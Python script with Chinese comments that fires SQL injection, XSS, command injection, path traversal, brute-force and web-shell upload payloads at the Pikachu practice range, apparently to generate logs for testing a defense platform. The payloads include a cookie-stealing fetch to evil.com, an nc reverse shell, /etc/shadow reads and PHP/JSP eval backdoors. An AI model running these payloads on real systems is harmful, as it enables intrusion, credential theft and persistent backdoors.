#!/usr/bin/env python3
"""Pikachu 靶场自动化攻击脚本

对 Pikachu 靶场执行多种常见 Web 攻击，用于测试日志采集链路。
攻击流量经过 log_proxy 时会被记录为 JSON 日志，供 PikachuCollector 采集。

用法:
    python3 scripts/attack_pikachu.py [--target http://localhost:8889] [--rounds 3]
"""

import argparse
import random
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

# ============================================================
# 攻击载荷定义
# ============================================================

SQL_INJECTION_PAYLOADS = [
    # 基于字符串型的注入
    "' OR '1'='1' -- ",
    "' OR '1'='1'/*",
    "admin' -- ",
    "' UNION SELECT 1,2,3 -- ",
    "' UNION SELECT username,password FROM users -- ",
    "1' AND 1=1 -- ",
    "1' AND 1=2 -- ",
    # 基于数值型的注入
    "1 OR 1=1",
    "1 UNION SELECT 1,2,3",
    # 盲注
    "' AND SLEEP(3) -- ",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 -- ",
    "' AND SUBSTRING(version(),1,1)='5' -- ",
    # 报错注入
    "' AND extractvalue(1,concat(0x7e,(SELECT version()))) -- ",
    "' AND updatexml(1,concat(0x7e,(SELECT user())),1) -- ",
]

XSS_PAYLOADS = [
    # 反射型 XSS
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(document.cookie)</script>',
    "javascript:alert(1)",
    '<iframe src="javascript:alert(1)">',
    # DOM XSS
    '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
    # 存储型 XSS
    '<script>fetch("http://evil.com/?c="+document.cookie)</script>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
]

RCE_PAYLOADS = [
    # 命令注入
    "127.0.0.1 | id",
    "127.0.0.1 ; cat /etc/passwd",
    "127.0.0.1 && whoami",
    "127.0.0.1 | uname -a",
    "`id`",
    "$(cat /etc/passwd)",
    "127.0.0.1 | ls -la /",
    "127.0.0.1 ; ping -c 3 evil.com",
    "127.0.0.1 | nc -e /bin/sh evil.com 4444",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\windows\\system32\\config\\sam",
    "../../../proc/self/environ",
]

BRUTE_FORCE_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("admin", "pikachu"),
    ("test", "test"),
    ("admin", "1234"),
    ("admin", "admin888"),
    ("user", "user"),
    ("guest", "guest"),
]

FILE_UPLOAD_PAYLOADS = [
    ("shell.php", "<?php @eval($_POST['cmd']); ?>", "application/x-php"),
    ("backdoor.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/octet-stream"),
    ("test.php.jpg", "<?php system('id'); ?>", "image/jpeg"),
    ("cmd.asp", '<% eval request("cmd") %>', "application/octet-stream"),
]


# ============================================================
# 攻击函数
# ============================================================

def send_request(url: str, data: str = None, method: str = "GET") -> tuple[int, str]:
    """发送 HTTP 请求，返回 (状态码, 响应体前500字符)"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (AttackBot/1.0; ICS-Defense-Test)",
            "Accept": "text/html,application/json",
        }
        if data and method == "POST":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            req = urllib.request.Request(url, data=data.encode("utf-8"), headers=headers, method="POST")
        else:
            req = urllib.request.Request(url, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")[:500]
            return resp.status, body
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")[:500]
    except Exception as e:
        return 0, str(e)


def attack_sql_injection(target: str) -> int:
    """SQL 注入攻击"""
    print("\n[1/6] SQL Injection Attacks")
    print("=" * 50)
    count = 0
    # 字符型注入 - GET
    for payload in SQL_INJECTION_PAYLOADS:
        encoded = urllib.parse.quote(payload)
        url = f"{target}/vul/sqli/sqli_str.php?name={encoded}&submit=%E6%9F%A5%E8%AF%A2"
        status, body = send_request(url)
        flag = "HIT" if ("uid" in body.lower() or "username" in body.lower() or "error" in body.lower()) else "---"
        print(f"  [{flag}] GET sqli_str: {payload[:60]:<60} -> {status}")
        count += 1
        time.sleep(0.3)

    # 数值型注入 - POST
    for payload in ["1 OR 1=1", "1 UNION SELECT 1,2"]:
        url = f"{target}/vul/sqli/sqli_id.php"
        data = f"id={urllib.parse.quote(payload)}&submit=%E6%9F%A5%E8%AF%A2"
        status, body = send_request(url, data=data, method="POST")
        flag = "HIT" if "uid" in body.lower() else "---"
        print(f"  [{flag}] POST sqli_id: {payload:<60} -> {status}")
        count += 1
        time.sleep(0.3)

    print(f"  >> SQL Injection: {count} payloads sent")
    return count


def attack_xss(target: str) -> int:
    """XSS 攻击"""
    print("\n[2/6] XSS (Cross-Site Scripting) Attacks")
    print("=" * 50)
    count = 0
    # 反射型 XSS - GET
    for payload in XSS_PAYLOADS:
        encoded = urllib.parse.quote(payload)
        url = f"{target}/vul/xss/xss_reflected_get.php?message={encoded}&submit=submit"
        status, body = send_request(url)
        flag = "HIT" if (payload.lower().replace('"', "'") in body.lower() or "script" in body.lower()) else "---"
        print(f"  [{flag}] Reflected XSS: {payload[:60]:<60} -> {status}")
        count += 1
        time.sleep(0.3)

    # 存储型 XSS - POST
    for payload in XSS_PAYLOADS[:5]:
        url = f"{target}/vul/xss/xss_stored.php"
        data = f"message={urllib.parse.quote(payload)}&submit=submit"
        status, body = send_request(url, data=data, method="POST")
        flag = "HIT" if "script" in body.lower() or "alert" in body.lower() else "---"
        print(f"  [{flag}] Stored XSS:    {payload[:60]:<60} -> {status}")
        count += 1
        time.sleep(0.3)

    print(f"  >> XSS: {count} payloads sent")
    return count


def attack_rce(target: str) -> int:
    """远程命令执行攻击"""
    print("\n[3/6] RCE (Remote Command Execution) Attacks")
    print("=" * 50)
    count = 0
    for payload in RCE_PAYLOADS:
        url = f"{target}/vul/rce/rce_ping.php"
        data = f"ipaddress={urllib.parse.quote(payload)}&submit=ping"
        status, body = send_request(url, data=data, method="POST")
        flag = "HIT" if any(kw in body.lower() for kw in ["uid=", "root:", "linux", "total"]) else "---"
        print(f"  [{flag}] RCE: {payload[:60]:<60} -> {status}")
        count += 1
        time.sleep(0.5)

    # eval 注入
    eval_payloads = [
        "phpinfo();",
        "system('id');",
        "echo shell_exec('whoami');",
    ]
    for payload in eval_payloads:
        url = f"{target}/vul/rce/rce_eval.php"
        data = f"txt={urllib.parse.quote(payload)}&submit=%E6%8F%90%E4%BA%A4"
        status, body = send_request(url, data=data, method="POST")
        flag = "HIT" if any(kw in body.lower() for kw in ["phpinfo", "uid=", "www-data"]) else "---"
        print(f"  [{flag}] EVAL: {payload[:60]:<60} -> {status}")
        count += 1
        time.sleep(0.5)

    print(f"  >> RCE: {count} payloads sent")
    return count


def attack_path_traversal(target: str) -> int:
    """目录遍历攻击"""
    print("\n[4/6] Path Traversal Attacks")
    print("=" * 50)
    count = 0
    for payload in PATH_TRAVERSAL_PAYLOADS:
        encoded = urllib.parse.quote(payload)
        # 尝试文件包含漏洞
        url = f"{target}/vul/fileinclude/fi_local.php?filename={encoded}&submit=%E6%8F%90%E4%BA%A4"
        status, body = send_request(url)
        flag = "HIT" if any(kw in body for kw in ["root:", "daemon:", "[extensions]"]) else "---"
        print(f"  [{flag}] LFI: {payload[:60]:<60} -> {status}")
        count += 1
        time.sleep(0.3)

    # 远程文件包含
    rfi_payloads = [
        "http://evil.com/shell.txt",
        "https://attacker.com/malware.php",
    ]
    for payload in rfi_payloads:
        encoded = urllib.parse.quote(payload)
        url = f"{target}/vul/fileinclude/fi_remote.php?filename={encoded}&submit=%E6%8F%90%E4%BA%A4"
        status, body = send_request(url)
        print(f"  [---] RFI: {payload[:60]:<60} -> {status}")
        count += 1
        time.sleep(0.3)

    print(f"  >> Path Traversal: {count} payloads sent")
    return count


def attack_brute_force(target: str) -> int:
    """暴力破解攻击"""
    print("\n[5/6] Brute Force Login Attacks")
    print("=" * 50)
    count = 0
    for username, password in BRUTE_FORCE_CREDENTIALS:
        url = f"{target}/vul/burteforce/bf_form.php"
        data = f"username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}&submit=Login"
        status, body = send_request(url, data=data, method="POST")
        flag = "HIT" if "login success" in body.lower() or "welcome" in body.lower() else "---"
        print(f"  [{flag}] Login: {username}:{password:<20} -> {status}")
        count += 1
        time.sleep(0.2)  # 快速尝试，触发暴力破解检测

    print(f"  >> Brute Force: {count} attempts")
    return count


def attack_file_upload(target: str) -> int:
    """恶意文件上传攻击"""
    print("\n[6/6] Malicious File Upload Attacks")
    print("=" * 50)
    count = 0
    boundary = "----WebKitFormBoundary" + str(random.randint(100000, 999999))
    for filename, content, content_type in FILE_UPLOAD_PAYLOADS:
        url = f"{target}/vul/unsafeupload/clientcheck.php"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="uploadfile"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
            f"{content}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="submit"\r\n\r\n'
            f"开始上传\r\n"
            f"--{boundary}--\r\n"
        )
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (AttackBot/1.0; ICS-Defense-Test)",
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            }
            req = urllib.request.Request(url, data=body.encode("utf-8"), headers=headers, method="POST")
            with urllib.request.urlopen(req, timeout=10) as resp:
                status = resp.status
                resp_body = resp.read().decode("utf-8", errors="replace")[:500]
        except urllib.error.HTTPError as e:
            status = e.code
            resp_body = ""
        except Exception as e:
            status = 0
            resp_body = str(e)

        flag = "HIT" if status == 200 and "success" in resp_body.lower() else "---"
        print(f"  [{flag}] Upload: {filename:<30} ({content_type}) -> {status}")
        count += 1
        time.sleep(0.5)

    print(f"  >> File Upload: {count} payloads sent")
    return count


# ============================================================
# 主流程
# ============================================================

def run_all_attacks(target: str, rounds: int = 1):
    """执行所有攻击轮次"""
    print(f"""
╔══════════════════════════════════════════════════════╗
║         Pikachu 靶场自动化攻击测试脚本               ║
║         ICS Defense Platform - Log Generator         ║
╚══════════════════════════════════════════════════════╝

  Target:  {target}
  Rounds:  {rounds}
  Purpose: 生成攻击日志，验证采集 → 分析 → 响应链路
""")

    # 检查目标是否可达
    print("[*] Checking target availability...")
    status, _ = send_request(target)
    if status == 0:
        print(f"[!] Target {target} is not reachable. Is the range running?")
        print("    Run: docker compose -f docker-compose.range.yml up -d")
        sys.exit(1)
    print(f"[+] Target is up (HTTP {status})")

    total = 0
    for r in range(1, rounds + 1):
        print(f"\n{'#' * 60}")
        print(f"# ROUND {r}/{rounds}")
        print(f"{'#' * 60}")

        total += attack_sql_injection(target)
        total += attack_xss(target)
        total += attack_rce(target)
        total += attack_path_traversal(target)
        total += attack_brute_force(target)
        total += attack_file_upload(target)

        if r < rounds:
            wait = random.randint(2, 5)
            print(f"\n[*] Waiting {wait}s before next round...")
            time.sleep(wait)

    print(f"""
╔══════════════════════════════════════════════════════╗
║  Attack Complete!                                    ║
║  Total payloads sent: {total:<32}║
║                                                      ║
║  Logs written to: range-logs/pikachu/                ║
║  PikachuCollector watch_dir: /var/log/pikachu/       ║
╚══════════════════════════════════════════════════════╝
""")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Pikachu 靶场攻击脚本")
    parser.add_argument(
        "--target", default="http://localhost:8889",
        help="靶场地址（通过日志代理）, 默认 http://localhost:8889",
    )
    parser.add_argument(
        "--rounds", type=int, default=1,
        help="攻击轮次，默认 1",
    )
    args = parser.parse_args()
    run_all_attacks(args.target, args.rounds)
